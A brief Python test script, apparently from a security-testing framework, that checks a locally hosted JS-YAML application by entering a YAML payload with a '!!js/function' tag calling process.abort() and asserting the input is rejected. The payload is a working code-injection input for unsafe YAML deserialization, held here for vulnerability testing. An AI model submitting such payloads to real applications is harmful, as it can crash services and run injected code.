from data.exploits.framework.BasicExploit import BasicExploit

class Exploit(BasicExploit):

    attributes = {
          "Name" : "JS-YAML_test",
          "Description" : "Test suite for the JS-YAML application",
          "Target" : "JS-YAML",
          "Container" : "ubuntu-node",
          "Type" : "N/A"
          #http://www.exploit-db.com/exploits/28655/
    }     
   
    def runExploit(self):
        w = self.wrapper
        w.navigate("http://localhost:49160/")
        w.find("name").keys("a: !!js/function function f() {process.abort();}();")
        self.assertIn("not found", w.page_source())
